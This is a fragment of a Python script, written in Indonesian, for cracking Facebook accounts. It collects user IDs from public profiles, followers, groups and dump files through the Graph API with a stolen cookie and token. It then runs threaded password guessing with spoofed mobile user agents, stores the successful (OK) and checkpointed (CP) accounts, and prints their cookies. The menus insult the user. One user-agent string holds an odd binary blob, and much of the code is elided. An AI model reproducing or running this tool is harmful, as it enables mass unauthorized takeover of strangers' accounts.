...
def login_lagi334():
	try:
		...
		cookie=input(f'  [{h}•{N}] Masukkan Cookies :{asu} ')
...
def menu(my_name,my_id):
	try:
		...
		print(f'   {P}[{k}+{P}] Cookies Kadaluarsa ')
		time.sleep(5)
		login_lagi334()
	os.system('clear')
	banner()
	...
	alvino_xy(f'   {P}[{k}+{P}] ID  : '+str(my_id))
	alvino_xy(f'   {P}[{k}+{P}] IP  : {ip}')
	cetak(nel('\t[bold cyan]          ꧁༒︎• Status : Premium •༒︎꧂ [/bold cyan]'))
	cetak(nel('[bold green] [1] Crack Publik\n [2] Crack Follower\n [3] Crack Grup\n [4] Crack File\n [5] Hasil Crack\n [0] Keluar [bold green]')) 
	_____cowok__pink_____ = input(f'   {P}[{k}+{P}] Pilih Menu :{h} ')
	if _____cowok__pink_____ in ['1']:
		...
		print(f'   {P}[{k}+{P}] Sukses Logout+Hapus Kukis ')
		exit()
	else:
		print(f'   {P}[{k}+{P}] Pilih Yang Bener Asu ')
		back()
def error():
	print(f'   {P}[{k}+{P}] Maaf Fitur Ini Masih Di Perbaiki {u}')
	time.sleep(4)
	back()
#-----------------[ HASIL-CRACK ]-----------------#
def result():
	print(f'   {P}[{h}1{P}] Hasil {h}OK {P}Anda ')
	print(f'   {P}[{k}2{P}] Hasil {k}CP {P}Anda ')
	print(f'   {P}[{k}3{P}] Kembali	')
	kz = input(f'   {P}[{k}+{P}] Pilih Hasil : ')
	if kz in ['1','01']:
		try:vin = os.listdir('CP')
		except FileNotFoundError:
			print(f'   {P}[{k}3{P}] File Tidak Di Temukan ')
			time.sleep(3)
			back()
		if len(vin)==0:
			print(f'   {P}[{k}3{P}] Anda Tidak Memiliki Hasil CP ')
			time.sleep(2)
			back()
		else:
			cih = 0
			...
			geeh = input(f'   {P}[{k}3{P}] Pilih : ')
			try:geh = lol[geeh]
			except KeyError:
				print(f'   {P}[{k}3{P}] Pilih Yang Bener Kontol 😆')
				exit()
		...
		try:vin = os.listdir('OK')
			...
			back()
		if len(vin)==0:
			print(f'   {P}[{k}3{P}] Anda Tidak Mempunyai File OK ')
			time.sleep(2)
			back()
		else:
			cih = 0
			...
			try:geh = lol[geeh]
				...
				print(f'   {P}[{k}3{P}] Pilih Yang Bener TOLOL ')
				exit()
			...
			for cpku in range(len(lin)):
				...
				print(f'   {P}[{k}3{P}] {hh}COOKIE : {u}{cpkuni[2]}')
				nocp +=1
			input('[ Klik Enter ]')
			back()
	elif kz in ['0','00']:
...
def dump_massal():
	try:
		...
		exit()
	try:
		jum = int(input(f'   {P}[{k}+{P}] Berapa Target 😛 :{h} '))
	except ValueError:
		print(f'   {P}[{k}+{P}] Salah Ketik Kau Goblok ')
		exit()
	if jum<1 or jum>100:
		print(f'   {P}[{k}+{P}] Gagal Dump Id ')
		exit()
	ses=requests.Session()
	yz = 0
	for met in range(jum):
		yz+=1
		kl = input(f'   {P}[{k}+{P}] Masukan Id 😅 '+str(yz)+' : ')
		uid.append(kl)
	for userr in uid:
		try:
			...
			print(f'   {P}[{k}+{P}] Sinyal Loh Kek Kontoll ')
			exit()
	try:
		print(f'   {P}[{p}+{P}] ChangFB')
		print(f'   {P}[{k}+{P}] Total Id Yang Terkumpul : {P}'+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print(f'{u}')
		print(f'   {P}[{k}+{P}] Sinyal Lo kek Kontol ')
		back()
	except (KeyError,IOError):
		print(f'   {P}[{k}+{P}] Pertemanan Tidak Public {u}')
		time.sleep(3)
		back()
#-------------------[ CRACK-PENGIKUT ]----------------#
def dump_pengikut():
	try:
		...
		exit()
	print(f'   {P}[{k}+{P}] Ketik ( me ) Jika Ingin Crack Follower Sendiri ')
	pil = input(f'   {P}[{k}+{P}] Masukkan Id Target : ')
	try:
		koh2 = requests.get('https://graph.facebook.com/'+pil+'?fields=subscribers.limit(99999)&access_token='+tokenku[0],cookies={'cookie': cok}).json()
		for pi in koh2['subscribers']['data']:
			try:id.append(pi['id']+'|'+pi['name'])
			except:continue
		print(f'   {P}[{k}+{P}] Total Idz :{h} '+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print(f'   {P}[{k}+{P}] Koneksi Internet Bermasalah ')
		exit()
	except (KeyError,IOError):
		print(f'   {P}[{k}+{P}] Gagal Mengambil Target ')
		exit()
#------------------[ CRACK-GRUP ]-----------------#
balmond = b+"["+h+"✓"+b+"]"

def lah():
	print("\r"+balmond+m+"   {P}[{k}+{P}] Total ID Yang Terkumpul :\x1b[1;97m "+str(len(id))+"                     ")
...
def crack_file():
	try:vin = os.listdir('DUMP')
		...
		print(f'   {P}[{k}+{P}] File Tidak Ditemukan ')
		time.sleep(2)
		back()
	if len(vin)==0:
		print(f'   {P}[{k}+{P}] Kamu Tidak Memiliki File Dump ')
		time.sleep(2)
		back()
	else:
		cih = 0
		...
		for isi in vin:
			...
			if cih<100:
				...
				lol.update({str(cih):str(isi)})
				lol.update({nom:str(isi)})
				print(f'   {P}[{k}+{P}] %s. %s ({h} %s{u} idz )'%(nom,isi,len(hem)))
			else:
				lol.update({str(cih):str(isi)})
				print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+u)
				print(f'   {P}[{k}+{P}] %s. %s ({h} %s {u}idz) '%(cih,isi,len(hem)))
		geeh = input(f'   {P}[{k}+{P}] Pilih : ')
		try:geh = lol[geeh]
		except KeyError:
			print(f'   {P}[{k}+{P}] Pilih Yang Bener Kontol {u}')
			time.sleep(3)
			back()
		try:lin = open('DUMP/'+geh,'r').read().splitlines()
		except:
			print(f'   {P}[{k}+{P}] File Tidak Ditemukan, Coba Lagi Nanti ')
			time.sleep(2)
			back()
		for xid in lin:
			id.append(xid)
...
#-------------[ PENGATURAN-IDZ ]---------------#
def setting():
	cetak(nel('\t[bold cyan]      ─━㋱• Metode Crack Facebook •㋱━─ [/bold cyan]'))
	print(f'   {P}[{p}+{P}] The Changcuters') 
	cetak(nel('[bold yellow] [1] Akun Old \n [2] Akun New\n [3] Random [bold yellow]'))
	hu = input(f'   {P}[{k}+{P}] Pilih Akun : ')
	if hu in ['1','01']:
...
#	if _jembot_ in ['']:
#		print(f'   {P}[{k}+{P}] Pilih Yang Bener Kontol ')
#		back()
#	elif _jembot_ in ['y','Y']:
#		taplikasi.append('ya')
#	else:
#		taplikasi.append('no')
	pwplus=input(f'   {P}[{k}+{P}] Tambahkan Password {k}Manual{P}/{h}Depault {P}[{k}M{P}/{h}D{P}] ')
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		...
		pwku=input(f'   {P}[{k}+{P}] Masukkan Password Tambahan : ')
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
	else:
	...
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			...
			if 'mobile' in method:
				...
				pool.submit(crackmbasic,idf,pwv)
	print('')
	cetak(nel('\t[purple]   {P}[{k}+{P}] [green] Crack Selesai Ngab, Jangan Lupa Bersyukur[purple] <<[yellow] '))
	print(f'   {P}[{h}+{P}] OK : {h}%s '%(ok))
	print(f'   {P}[{k}+{P}] CP : {k}%s{u} '%(cp))
	print('')
	print(f'   {P}[{k}+{P}] Lanjut Crack Kembali ( Y/t ) ? ')
	woi = input(f'   {P}[{k}+{P}] Pilih : ')
	if woi in ['y','Y']:
		back()
	else:
		print(f'   {P}[{k}+{P}] {k} Good Bye Dadaahh{u} ')
		time.sleep(2)
		exit()
#--------------------[ METODE-B-API ]-----------------#
def crack(idf,pwv):
	...
	ua ='Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]","Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)","Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36'
	ua2 ='Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]","NokiaX2-00/5.0 (08.25) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-T875 Build/RP1A.200 720.012) AppleWebKit /537.36 (KHTML, like Gecko) Version /4.0 Chrome /96.0.4664.104 Safari/537.36 GNews Android /2022034746 UNTRUSTED/1.0","Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]",b"\xaaJ\xdb\x81\x01\xfc\xa4\xcaG\xd8\x01\xca.(\x91\xa9c\xafb\xa6\xa6\x94/\xad\x82\x94\x84`\xd0\xbb\xe2\xaf\xe2\xba&\xb80s\xedl\xf5=C\x8caN\xdc0;$\xf0\xae&\xc7\xaeq7U\x8b\r[\x8cg\xd3\x88\xd74\xb8\x07\x9b2\x13\x95\\\xe3/N\x02\xfb@\xee/\x9c\x81\x1e(\x18\xec\xcd;\xab+M\xdb\x9a\xd3\xf9\xf4\x18#[@\xa4\xf0\xae\xb5\xfdZ\x07}\xa9\xff=\xa6\x14\xa4\r\x87@\xbb\xda\x04\xbd\xf6[\x14\x8f\x88Q\xed;\xc5\x9e2e`\xe5\xc7~~\x03\xf4\xb8\x12\n\xa4[\xd5R\xa5\x94(?l\x94\x0be$/K\xfc\x0c0\x83\x0eIN%\x9cx","Mozilla/5.0 (Linux; U; Android 9; LGL722DL Build/PKQ1.190302.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0.3945.116 Mobile Safari/537.36 OPR/60.0.2254.59405","Mozilla/5.0 (Linux; Android 10; Nokia 7.2 Build/QKQ1.191014.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0.3945.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/264.0.0.44.111'
	ua2 ='Mozilla/5.0 (Linux; Android 10; S40Pro Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36'
	ses = requests.Session()
	for pw in pwv:
		try:
